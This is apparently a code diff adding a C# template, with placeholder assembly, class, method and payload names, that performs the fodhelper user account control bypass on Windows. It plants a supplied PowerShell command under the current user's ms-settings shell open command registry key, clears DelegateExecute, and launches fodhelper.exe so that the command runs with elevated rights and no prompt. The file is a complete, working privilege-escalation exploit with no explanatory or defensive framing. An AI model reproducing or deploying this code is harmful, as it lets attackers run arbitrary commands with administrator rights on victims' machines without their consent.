@@ -1,0 +1,49 @@
+using System;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace [[[[assemblyName]]]]
+{
+    public class [[[[className]]]]
+    {
+        public static void [[[[methodName]]]]()
+        {
+            string powershellCommand = "[[[[powershellCommand]]]]";
+
+            var key = Registry.CurrentUser.OpenSubKey(@"Software\Classes", true);
+            if (key.OpenSubKey("ms-settings") == null)
+            { key = key.CreateSubKey("ms-settings", true); }
+            else { key = key.OpenSubKey("ms-settings", true); }
+
+            if (key.OpenSubKey("shell") == null)
+            { key = key.CreateSubKey("shell", true); }
+            else { key = key.OpenSubKey("shell", true); }
+
+            if (key.OpenSubKey("open") == null)
+            { key = key.CreateSubKey("open", true); }
+            else { key = key.OpenSubKey("open", true); }
+
+            if (key.OpenSubKey("command") == null)
+            { key = key.CreateSubKey("command", true); }
+            else { key = key.OpenSubKey("command", true); }
+
+            key.SetValue(null, powershellCommand);
+            key.SetValue("DelegateExecute", "");
+
+           
+            string executablePath = @"C:\Windows\System32\fodhelper.exe";
+
+            
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = executablePath, 
+                UseShellExecute = true,   
+                RedirectStandardOutput = false, 
+                CreateNoWindow = true    
+            };
+
+            Process process = new Process { StartInfo = startInfo };
+            process.Start();
+        }
+    }
+}
